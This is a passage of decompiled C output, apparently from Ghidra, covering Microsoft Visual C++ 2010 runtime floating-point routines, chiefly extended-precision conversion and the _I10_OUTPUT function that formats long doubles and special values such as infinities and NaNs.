    uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
    iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a);
    uVar14 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e);
    uVar13 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    uVar12 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    iVar16 = CONCAT22(uStack_4a._2_2_,(undefined2)uStack_4a);
    if (local_6c < 0) {
      local_68 = -local_68;
    }
    local_58 = (char *)(local_68 + local_54);
    if (!bVar5) {
      local_58 = (char *)((int)local_58 + scale);
    }
    if (!bVar6) {
      local_58 = (char *)((int)local_58 - decpt);
    }
    if ((int)local_58 < 0x1451) {
      if ((int)local_58 < -0x1450) goto LAB_00411dcc;
      ppuVar17 = &PTR_DAT_00419f10;
      if (local_58 != (char *)0x0) {
        if ((int)local_58 < 0) {
          local_58 = (char *)-(int)local_58;
          ppuVar17 = (undefined **)&DAT_0041a070;
        }
        if (mult12 == 0) {
          local_40._0_2_ = 0;
        }
        iVar16 = uStack_4a;
        uVar12 = uVar13;
        uVar14 = uStack_2e;
        iVar1 = uStack_2a;
        uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
        iVar2 = local_3c;
joined_r0x00411ac8:
        if (local_58 != (char *)0x0) {
          uStack_38._2_2_ = (ushort)(uVar12 >> 0x10);
          uVar13 = (int)local_58 >> 3;
          ppuVar17 = ppuVar17 + 0x15;
          uVar11 = (uint)local_58 & 7;
          local_58 = (char *)uVar13;
          if (uVar11 != 0) {
            ppuVar20 = ppuVar17 + uVar11 * 3;
            if (0x7fff < *(ushort *)ppuVar20) {
              local_4c = SUB42(*ppuVar20,0);
              uStack_4a._0_2_ = (undefined2)((uint)*ppuVar20 >> 0x10);
              uStack_4a._2_2_ = SUB42(ppuVar20[1],0);
              uStack_46 = (undefined2)((uint)ppuVar20[1] >> 0x10);
              local_44 = ppuVar20[2];
              iVar16 = CONCAT22(uStack_4a._2_2_,(undefined2)uStack_4a) + -1;
              uStack_4a._0_2_ = (undefined2)iVar16;
              uStack_4a._2_2_ = (undefined2)((uint)iVar16 >> 0x10);
              ppuVar20 = (undefined **)&local_4c;
            }
            local_54 = 0;
            local_30 = 0;
            uStack_2f = 0;
            uStack_2e._0_2_ = 0;
            uStack_2e._2_2_ = 0;
            uVar14 = 0;
            uStack_2a._0_2_ = 0;
            uStack_2a._2_2_ = 0;
            iVar1 = 0;
            uStack_26 = 0;
            uVar9 = *(ushort *)((int)ppuVar20 + 10) & 0x7fff;
            uVar21 = (*(ushort *)((int)ppuVar20 + 10) ^ uStack_38._2_2_) & 0x8000;
            uVar15 = uVar9 + (uStack_38._2_2_ & 0x7fff);
            if ((((uStack_38._2_2_ & 0x7fff) < 0x7fff) && (uVar9 < 0x7fff)) && (uVar15 < 0xbffe)) {
              if (0x3fbf < uVar15) {
                if ((((uVar12 & 0x7fff0000) == 0) &&
                    (uVar15 = uVar15 + 1, (uVar12 & 0x7fffffff) == 0)) &&
                   ((iVar2 == 0 && (uVar3 == 0)))) {
                  uStack_38._2_2_ = 0;
                  uVar12 = uVar12 & 0xffff;
                  uVar14 = 0;
                  iVar1 = 0;
                }
                else if (((uVar9 == 0) &&
                         (uVar15 = uVar15 + 1, ((uint)ppuVar20[2] & 0x7fffffff) == 0)) &&
                        ((ppuVar20[1] == (undefined *)0x0 && (*ppuVar20 == (undefined *)0x0)))) {
                  uStack_38._0_2_ = 0;
                  uStack_38._2_2_ = 0;
                  uVar12 = 0;
                  local_3c._0_2_ = 0;
                  local_3c._2_2_ = 0;
                  local_40._0_2_ = 0;
                  local_40._2_2_ = 0;
                  uVar3 = 0;
                  iVar2 = 0;
                }
                else {
                  local_6c = 0;
                  psVar24 = (short *)((int)&uStack_2e + 2);
                  local_5c = 5;
                  do {
                    local_68 = local_5c;
                    if (0 < local_5c) {
                      local_60 = (ushort *)((int)&local_40 + local_6c * 2);
                      local_64 = ppuVar20 + 2;
                      do {
                        bVar4 = false;
                        uVar14 = *(uint *)(psVar24 + -2) +
                                 (uint)*(ushort *)local_64 * (uint)*local_60;
                        if ((uVar14 < *(uint *)(psVar24 + -2)) ||
                           (uVar14 < (uint)*(ushort *)local_64 * (uint)*local_60)) {
                          bVar4 = true;
                        }
                        *(uint *)(psVar24 + -2) = uVar14;
                        if (bVar4) {
                          *psVar24 = *psVar24 + 1;
                        }
                        local_60 = local_60 + 1;
                        local_64 = (undefined **)((int)local_64 + -2);
                        local_68 = local_68 + -1;
                      } while (0 < local_68);
                    }
                    psVar24 = psVar24 + 1;
                    local_6c = local_6c + 1;
                    local_5c = local_5c + -1;
                  } while (0 < local_5c);
                  uVar15 = uVar15 + 0xc002;
                  if ((short)uVar15 < 1) {
LAB_00411c84:
                    uVar15 = uVar15 - 1;
                    if ((short)uVar15 < 0) {
                      uVar14 = (uint)(ushort)-uVar15;
                      uVar15 = 0;
                      do {
                        if ((local_30 & 1) != 0) {
                          local_54 = local_54 + 1;
                        }
                        iVar2 = CONCAT22(uStack_26,uStack_2a._2_2_);
                        uVar12 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_);
                        iVar1 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_);
                        uStack_2a._2_2_ = (ushort)(CONCAT22(uStack_26,uStack_2a._2_2_) >> 1);
                        uStack_26 = uStack_26 >> 1;
                        uStack_2a._0_2_ =
                             (ushort)uStack_2a >> 1 | (ushort)((uint)(iVar2 << 0x1f) >> 0x10);
                        uVar13 = CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) >> 1;
                        uStack_2e._0_2_ =
                             (ushort)uStack_2e >> 1 | (ushort)((uint)(iVar1 << 0x1f) >> 0x10);
                        uVar14 = uVar14 - 1;
                        uStack_2e._2_2_ = (ushort)(uVar12 >> 1);
                        local_30 = (byte)uVar13;
                        uStack_2f = (undefined1)(uVar13 >> 8);
                      } while (uVar14 != 0);
                      if (local_54 != 0) {
                        local_30 = local_30 | 1;
                      }
                    }
                  }
                  else {
                    do {
                      uVar9 = (ushort)uStack_2e;
                      if ((short)uStack_26 < 0) break;
                      iVar1 = CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) << 1;
                      local_30 = (byte)iVar1;
                      uStack_2f = (undefined1)((uint)iVar1 >> 8);
                      uStack_2e._0_2_ = (ushort)((uint)iVar1 >> 0x10);
                      iVar1 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_) * 2;
                      uStack_2e._2_2_ = (ushort)iVar1 | uVar9 >> 0xf;
                      iVar2 = CONCAT22(uStack_26,uStack_2a._2_2_) * 2;
                      uStack_2a._2_2_ = (ushort)iVar2 | (ushort)uStack_2a >> 0xf;
                      uVar15 = uVar15 - 1;
                      uStack_2a._0_2_ = (ushort)((uint)iVar1 >> 0x10);
                      uStack_26 = (ushort)((uint)iVar2 >> 0x10);
                    } while (0 < (short)uVar15);
                    if ((short)uVar15 < 1) goto LAB_00411c84;
                  }
                  if ((0x8000 < CONCAT11(uStack_2f,local_30)) ||
                     (iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a),
                     uVar14 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e),
                     (CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) & 0x1ffff) == 0x18000
                     )) {
                    if (CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e) == -1) {
                      uVar14 = 0;
                      if (CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a) == -1) {
                        if (uStack_26 == 0xffff) {
                          uStack_26 = 0x8000;
                          uVar15 = uVar15 + 1;
                          iVar1 = 0;
                          uVar14 = 0;
                        }
                        else {
                          uStack_26 = uStack_26 + 1;
                          iVar1 = 0;
                          uVar14 = 0;
                        }
                      }
                      else {
                        iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a) + 1;
                      }
                    }
                    else {
                      uVar14 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e) + 1;
                      iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a);
                    }
                  }
                  if (uVar15 < 0x7fff) {
                    local_40 = uVar14;
                    local_3c = iVar1;
                    uStack_38._0_2_ = uStack_26;
                    uStack_38._2_2_ = uVar15 | uVar21;
                    uVar12 = CONCAT22(uVar15 | uVar21,uStack_26);
                    uVar3 = uVar14;
                    iVar2 = iVar1;
                  }
                  else {
                    local_3c._0_2_ = 0;
                    local_3c._2_2_ = 0;
                    local_40._0_2_ = 0;
                    local_40._2_2_ = 0;
                    uVar12 = ((uVar21 == 0) - 1 & 0x80000000) + 0x7fff8000;
                    uStack_38._0_2_ = (ushort)uVar12;
                    uStack_38._2_2_ = (ushort)(uVar12 >> 0x10);
                    uVar3 = 0;
                    iVar2 = 0;
                  }
                }
                goto joined_r0x00411ac8;
              }
              uVar12 = 0;
              local_3c._0_2_ = 0;
              local_3c._2_2_ = 0;
              local_40._0_2_ = 0;
              local_40._2_2_ = 0;
            }
            else {
              local_3c._0_2_ = 0;
              local_3c._2_2_ = 0;
              uVar12 = ((uVar21 == 0) - 1 & 0x80000000) + 0x7fff8000;
              local_40._0_2_ = 0;
              local_40._2_2_ = 0;
            }
            uStack_38._0_2_ = (ushort)uVar12;
            uStack_38._2_2_ = (ushort)(uVar12 >> 0x10);
            uVar14 = 0;
            iVar1 = 0;
            uVar3 = 0;
            iVar2 = 0;
          }
          goto joined_r0x00411ac8;
        }
      }
      local_3c._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
      local_3c._0_2_ = (undefined2)iVar2;
      local_40._2_2_ = (undefined2)(uVar3 >> 0x10);
      local_40._0_2_ = (undefined2)uVar3;
      uStack_38._2_2_ = (ushort)(uVar12 >> 0x10);
      uStack_38._0_2_ = (ushort)uVar12;
      uVar22 = CONCAT22((undefined2)local_3c,local_40._2_2_);
      uVar19 = CONCAT22((ushort)uStack_38,local_3c._2_2_);
      uStack_4a = iVar16;
      uVar13 = uVar12;
      uStack_2e = uVar14;
      uStack_2a = iVar1;
      local_3c = iVar2;
    }
    else {
      uVar22 = 0;
      uStack_38._2_2_ = 0x7fff;
      uVar19 = 0x80000000;
      local_40._0_2_ = 0;
    }
  }
  else {
LAB_00411dcc:
    uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
    uVar13 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    local_40._0_2_ = 0;
    uStack_38._2_2_ = 0;
    uVar19 = 0;
    uVar22 = 0;
  }
  *(undefined2 *)pld12->ld12 = (undefined2)local_40;
  *(ushort *)(pld12->ld12 + 10) = uStack_38._2_2_ | uVar7;
  *(undefined4 *)(pld12->ld12 + 2) = uVar22;
  *(undefined4 *)(pld12->ld12 + 6) = uVar19;
LAB_00411deb:
  uStack_38 = uVar13;
  local_40 = uVar3;
  uVar14 = __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return uVar14;
}



/* Function: $I10_OUTPUT */

/* WARNING: Removing unreachable block (ram,0x0041233b) */
/* WARNING: Removing unreachable block (ram,0x00412345) */
/* WARNING: Removing unreachable block (ram,0x0041234a) */
/* Library Function - Single Match
    _$I10_OUTPUT
   
   Library: Visual Studio 2010 Release */

void __cdecl
_I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  int iVar1;
  undefined **ppuVar2;
  int iVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  errno_t eVar7;
  undefined **ppuVar8;
  ushort *puVar9;
  ushort uVar10;
  int iVar11;
  ushort uVar12;
  ushort uVar13;
  uint uVar14;
  char cVar15;
  uint uVar16;
  uint uVar17;
  short *psVar18;
  short *psVar19;
  ushort uVar20;
  short *psVar21;
  int iVar22;
  uint uVar23;
  uint uVar24;
  char *pcVar25;
  ushort *local_74;
  undefined **local_70;
  undefined **local_6c;
  ushort local_64;
  ushort *local_5c;
  int local_58;
  int local_54;
  short local_50;
  int local_4c;
  int local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
  ushort uStack_3a;
  undefined *local_38;
  undefined4 local_34;
  undefined4 local_30;
  ushort local_2c [4];
  undefined4 local_24;
  undefined1 auStack_20 [4];
  ushort uStack_1c;
  undefined1 local_1a;
  byte bStack_19;
  byte local_14;
  undefined1 uStack_13;
  undefined4 uStack_12;
  undefined4 uStack_e;
  ushort uStack_a;
  uint local_8;
  
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
  iVar3 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
  iVar11 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12);
  iVar22 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12);
  iVar5 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  iVar1 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_64 = param_3 & 0x8000;
  uVar14 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c[0] = 0xcccc;
  local_2c[1] = 0x3ffb;
  if (local_64 == 0) {
    *(undefined1 *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined1 *)(param_6 + 1) = 0x2d;
  }
  if ((short)uVar14 == 0) {
    if ((param_2 == 0) && (param_1 == 0)) {
      *param_6 = 0;
      *(byte *)(param_6 + 1) = ((local_64 != 0x8000) - 1U & 0xd) + 0x20;
      *(undefined2 *)((int)param_6 + 3) = 0x3001;
      *(undefined1 *)((int)param_6 + 5) = 0;
      iVar1 = iVar5;
      param_2 = CONCAT22(uStack_1c,auStack_20._2_2_);
      goto LAB_004126d8;
    }
  }
  else if ((short)uVar14 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((local_64 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_00411f4b;
        pcVar25 = "1#INF";
      }
      else {
        if (param_1 != 0) {
LAB_00411f4b:
          pcVar25 = "1#QNAN";
          goto LAB_00411f50;
        }
        pcVar25 = "1#IND";
      }
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar25);
      if (eVar7 != 0) goto LAB_00411efd;
      *(undefined1 *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar25 = "1#SNAN";
LAB_00411f50:
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar25);
      if (eVar7 != 0) {
LAB_00411efd:
                    /* WARNING: Subroutine does not return */
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined1 *)((int)param_6 + 3) = 6;
    }
    iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
    iVar11 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12);
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    iVar1 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    param_2 = CONCAT22(uStack_1c,auStack_20._2_2_);
    goto LAB_004126d8;
  }
  local_50 = (short)(((uVar14 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar14 * 0x4d10
                    >> 0x10);
  local_24._0_2_ = 0;
  uVar16 = (uint)local_50;
  local_1a = (undefined1)uVar14;
  bStack_19 = (byte)(uVar14 >> 8);
  auStack_20._2_2_ = (undefined2)param_2;
  uStack_1c = (ushort)(param_2 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  auStack_20._0_2_ = (undefined2)((uint)param_1 >> 0x10);
  local_6c = &PTR_DAT_00419f10;
  if (-uVar16 != 0) {
    uVar14 = -uVar16;
    iVar1 = iVar5;
    iVar22 = iVar11;
    iVar3 = iVar6;
    if (0 < (int)uVar16) {
      local_6c = (undefined **)&DAT_0041a070;
      uVar14 = uVar16;
    }
joined_r0x00411fcf:
    if (uVar14 != 0) {
      auStack_20._0_2_ = (undefined2)((uint)param_1 >> 0x10);
      local_24._2_2_ = (ushort)param_1;
      uStack_1c = (ushort)(param_2 >> 0x10);
      auStack_20._2_2_ = (undefined2)param_2;
      local_6c = local_6c + 0x15;
      uVar17 = (int)uVar14 >> 3;
      uVar16 = uVar14 & 7;
      uVar14 = uVar17;
      if (uVar16 != 0) {
        ppuVar8 = local_6c + uVar16 * 3;
        if (0x7fff < *(ushort *)ppuVar8) {
          local_40 = SUB42(*ppuVar8,0);
          uStack_3e._0_2_ = (undefined2)((uint)*ppuVar8 >> 0x10);
          ppuVar2 = ppuVar8 + 2;
          uStack_3e._2_2_ = SUB42(ppuVar8[1],0);
          uStack_3a = (ushort)((uint)ppuVar8[1] >> 0x10);
          ppuVar8 = (undefined **)&local_40;
          local_38 = *ppuVar2;
          iVar1 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
          uStack_3e._0_2_ = (undefined2)iVar1;
          uStack_3e._2_2_ = (undefined2)((uint)iVar1 >> 0x10);
        }
        local_4c = 0;
        local_14 = 0;
        uStack_13 = 0;
        uStack_12._0_2_ = 0;
        uStack_12._2_2_ = 0;
        iVar22 = 0;
        uStack_e._0_2_ = 0;
        uStack_e._2_2_ = 0;
        iVar3 = 0;
        uStack_a = 0;
        uVar12 = (*(ushort *)((int)ppuVar8 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
        uVar13 = CONCAT11(bStack_19,local_1a) & 0x7fff;
        uVar10 = *(ushort *)((int)ppuVar8 + 10) & 0x7fff;
        uVar20 = uVar10 + uVar13;
        if (((uVar13 < 0x7fff) && (uVar10 < 0x7fff)) && (uVar20 < 0xbffe)) {
          if (0x3fbf < uVar20) {
            if (((uVar13 == 0) &&
                (uVar20 = uVar20 + 1,
                (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
               ((CONCAT22(auStack_20._2_2_,auStack_20._0_2_) == 0 &&
                (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
              local_1a = 0;
              bStack_19 = 0;
              goto joined_r0x00411fcf;
            }
            if (((uVar10 != 0) || (uVar20 = uVar20 + 1, ((uint)ppuVar8[2] & 0x7fffffff) != 0)) ||
               ((ppuVar8[1] != (undefined *)0x0 || (*ppuVar8 != (undefined *)0x0)))) {
              local_58 = 0;
              psVar21 = (short *)((int)&uStack_12 + 2);
              local_44 = 5;
              do {
                local_54 = local_44;
                if (0 < local_44) {
                  local_74 = (ushort *)(auStack_20 + local_58 * 2 + -4);
                  local_70 = ppuVar8 + 2;
                  do {
                    bVar4 = false;
                    uVar16 = *(uint *)(psVar21 + -2) + (uint)*local_74 * (uint)*(ushort *)local_70;
                    if ((uVar16 < *(uint *)(psVar21 + -2)) ||
                       (uVar16 < (uint)*local_74 * (uint)*(ushort *)local_70)) {
                      bVar4 = true;
                    }
                    *(uint *)(psVar21 + -2) = uVar16;
                    if (bVar4) {
                      *psVar21 = *psVar21 + 1;
                    }
                    local_74 = local_74 + 1;
                    local_70 = (undefined **)((int)local_70 + -2);
                    local_54 = local_54 + -1;
                  } while (0 < local_54);
                }
                psVar21 = psVar21 + 1;
                local_58 = local_58 + 1;
                local_44 = local_44 + -1;
              } while (0 < local_44);
              uVar20 = uVar20 + 0xc002;
              if ((short)uVar20 < 1) {
LAB_00412182:
                uVar20 = uVar20 - 1;
                if ((short)uVar20 < 0) {
                  uVar16 = (uint)(ushort)-uVar20;
                  uVar20 = 0;
                  do {
                    if ((local_14 & 1) != 0) {
                      local_4c = local_4c + 1;
                    }
                    iVar11 = CONCAT22(uStack_a,uStack_e._2_2_);
                    uVar17 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
                    iVar22 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
                    uStack_e._2_2_ = (ushort)(CONCAT22(uStack_a,uStack_e._2_2_) >> 1);
                    uStack_a = uStack_a >> 1;
                    uStack_e._0_2_ =
                         (ushort)uStack_e >> 1 | (ushort)((uint)(iVar11 << 0x1f) >> 0x10);
                    uVar23 = CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                    uStack_12._0_2_ =
                         (ushort)uStack_12 >> 1 | (ushort)((uint)(iVar22 << 0x1f) >> 0x10);
                    uVar16 = uVar16 - 1;
                    uStack_12._2_2_ = (ushort)(uVar17 >> 1);
                    local_14 = (byte)uVar23;
                    uStack_13 = (undefined1)(uVar23 >> 8);
                  } while (uVar16 != 0);
                  if (local_4c != 0) {
                    local_14 = local_14 | 1;
                  }
                }
              }
              else {
                do {
                  uVar13 = (ushort)uStack_e;
                  uVar10 = (ushort)uStack_12;
                  if ((uStack_a & 0x8000) != 0) break;
                  iVar22 = CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) << 1;
                  local_14 = (byte)iVar22;
                  uStack_13 = (undefined1)((uint)iVar22 >> 8);
                  uStack_12._0_2_ = (ushort)((uint)iVar22 >> 0x10);
                  iVar22 = CONCAT22((ushort)uStack_e,uStack_12._2_2_) * 2;
                  uStack_12._2_2_ = (ushort)iVar22 | uVar10 >> 0xf;
                  uStack_e._0_2_ = (ushort)((uint)iVar22 >> 0x10);
                  iVar22 = CONCAT22(uStack_a,uStack_e._2_2_) * 2;
                  uStack_e._2_2_ = (ushort)iVar22 | uVar13 >> 0xf;
                  uVar20 = uVar20 - 1;
                  uStack_a = (ushort)((uint)iVar22 >> 0x10);
                } while (0 < (short)uVar20);
                if ((short)uVar20 < 1) goto LAB_00412182;
              }
              if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
                 (iVar3 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e),
                 iVar22 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12),
                 (CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
                if (CONCAT22(uStack_12._2_2_,(ushort)uStack_12) == -1) {
                  iVar22 = 0;
                  if (CONCAT22(uStack_e._2_2_,(ushort)uStack_e) == -1) {
                    if (uStack_a == 0xffff) {
                      uStack_a = 0x8000;
                      uVar20 = uVar20 + 1;
                      iVar3 = 0;
                      iVar22 = 0;
                    }
                    else {
                      uStack_a = uStack_a + 1;
                      iVar3 = 0;
                      iVar22 = 0;
                    }
                  }
                  else {
                    iVar3 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e) + 1;
                  }
                }
                else {
                  iVar22 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12) + 1;
                  iVar3 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e);
                }
              }
              uStack_12._2_2_ = (ushort)((uint)iVar22 >> 0x10);
              uStack_12._0_2_ = (ushort)iVar22;
              uStack_e._2_2_ = (ushort)((uint)iVar3 >> 0x10);
              uStack_e._0_2_ = (ushort)iVar3;
              if (uVar20 < 0x7fff) {
                bStack_19 = (byte)(uVar20 >> 8) | (byte)(uVar12 >> 8);
                local_24._0_2_ = (ushort)uStack_12;
                local_24._2_2_ = uStack_12._2_2_;
                param_1 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
                auStack_20 = (undefined1  [4])iVar3;
                uStack_1c = uStack_a;
                param_2 = CONCAT22(uStack_a,uStack_e._2_2_);
                local_1a = (undefined1)uVar20;
              }
              else {
                auStack_20._0_2_ = 0;
                auStack_20._2_2_ = 0;
                local_24._0_2_ = 0;
                local_24._2_2_ = 0;
                param_1 = 0;
                iVar11 = ((uVar12 == 0) - 1 & 0x80000000) + 0x7fff8000;
                uStack_1c = (ushort)iVar11;
                param_2 = 0x80000000;
                local_1a = (undefined1)((uint)iVar11 >> 0x10);
                bStack_19 = (byte)((uint)iVar11 >> 0x18);
              }
              goto joined_r0x00411fcf;
            }
          }
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
        }
        else {
          iVar22 = ((uVar12 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar22;
          local_1a = (undefined1)((uint)iVar22 >> 0x10);
          bStack_19 = (byte)((uint)iVar22 >> 0x18);
        }
        auStack_20._0_2_ = 0;
        auStack_20._2_2_ = 0;
        param_2 = (uint)uStack_1c << 0x10;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        param_1 = 0;
        iVar22 = 0;
        iVar3 = 0;
      }
      goto joined_r0x00411fcf;
    }
  }
  auStack_20._0_2_ = (undefined2)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uStack_1c = (ushort)(param_2 >> 0x10);
  auStack_20._2_2_ = (undefined2)param_2;
  uVar16 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
  iVar11 = iVar22;
  iVar6 = iVar3;
  if (0x3ffe < (ushort)(uVar16 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12._0_2_ = 0;
    uStack_12._2_2_ = 0;
    iVar11 = 0;
    uStack_e._0_2_ = 0;
    uStack_e._2_2_ = 0;
    iVar6 = 0;
    uStack_a = 0;
    uVar16 = uVar16 >> 0x10 & 0x7fff;
    iVar22 = uVar16 + 0x3ffb;
    if (((ushort)uVar16 < 0x7fff) && ((ushort)iVar22 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar22) {
        if (((((ushort)uVar16 == 0) &&
             (iVar22 = uVar16 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
            (CONCAT22(auStack_20._2_2_,auStack_20._0_2_) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          goto LAB_00412510;
        }
        local_58 = 0;
        psVar21 = (short *)((int)&uStack_12 + 2);
        local_44 = 5;
        do {
          local_4c = local_44;
          if (0 < local_44) {
            local_5c = local_2c;
            puVar9 = (ushort *)(auStack_20 + local_58 * 2 + -4);
            do {
              bVar4 = false;
              uVar16 = *(uint *)(psVar21 + -2) + (uint)*local_5c * (uint)*puVar9;
              if ((uVar16 < *(uint *)(psVar21 + -2)) || (uVar16 < (uint)*local_5c * (uint)*puVar9))
              {
                bVar4 = true;
              }
              *(uint *)(psVar21 + -2) = uVar16;
              if (bVar4) {
                *psVar21 = *psVar21 + 1;
              }
              local_5c = local_5c + -1;
              puVar9 = puVar9 + 1;
              local_4c = local_4c + -1;
            } while (0 < local_4c);
          }
          psVar21 = psVar21 + 1;
          local_58 = local_58 + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar22 = iVar22 + 0xc002;
        if ((short)iVar22 < 1) {
LAB_0041240b:
          uVar20 = (ushort)(iVar22 + 0xffff);
          if ((short)uVar20 < 0) {
            uVar16 = -(iVar22 + 0xffff);
            uVar14 = uVar16 & 0xffff;
            uVar20 = uVar20 + (short)uVar16;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar11 = CONCAT22(uStack_a,uStack_e._2_2_);
              uVar16 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
              iVar22 = CONCAT22((ushort)uStack_e,uStack_12._2_2_);
              uStack_e._2_2_ = (ushort)(CONCAT22(uStack_a,uStack_e._2_2_) >> 1);
              uStack_a = uStack_a >> 1;
              uStack_e._0_2_ = (ushort)uStack_e >> 1 | (ushort)((uint)(iVar11 << 0x1f) >> 0x10);
              uVar17 = CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12._0_2_ = (ushort)uStack_12 >> 1 | (ushort)((uint)(iVar22 << 0x1f) >> 0x10);
              uVar14 = uVar14 - 1;
              uStack_12._2_2_ = (ushort)(uVar16 >> 1);
              local_14 = (byte)uVar17;
              uStack_13 = (undefined1)(uVar17 >> 8);
            } while (uVar14 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar10 = (ushort)uStack_e;
            uVar20 = (ushort)uStack_12;
            if ((short)uStack_a < 0) break;
            iVar11 = CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar11;
            uStack_13 = (undefined1)((uint)iVar11 >> 8);
            uStack_12._0_2_ = (ushort)((uint)iVar11 >> 0x10);
            iVar11 = CONCAT22((ushort)uStack_e,uStack_12._2_2_) * 2;
            uStack_12._2_2_ = (ushort)iVar11 | uVar20 >> 0xf;
            uStack_e._0_2_ = (ushort)((uint)iVar11 >> 0x10);
            iVar11 = CONCAT22(uStack_a,uStack_e._2_2_) * 2;
            uStack_e._2_2_ = (ushort)iVar11 | uVar10 >> 0xf;
            iVar22 = iVar22 + 0xffff;
            uStack_a = (ushort)((uint)iVar11 >> 0x10);
          } while (0 < (short)iVar22);
          uVar20 = (ushort)iVar22;
          if ((short)uVar20 < 1) goto LAB_0041240b;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar6 = CONCAT22(uStack_e._2_2_,(ushort)uStack_e),
           iVar11 = CONCAT22(uStack_12._2_2_,(ushort)uStack_12),
           (CONCAT22((ushort)uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22(uStack_12._2_2_,(ushort)uStack_12) == -1) {
            iVar11 = 0;
            if (CONCAT22(uStack_e._2_2_,(ushort)uStack_e) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar20 = uVar20 + 1;
                iVar6 = 0;
                iVar11 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar6 = 0;
                iVar11 = 0;
              }
            }
            else {
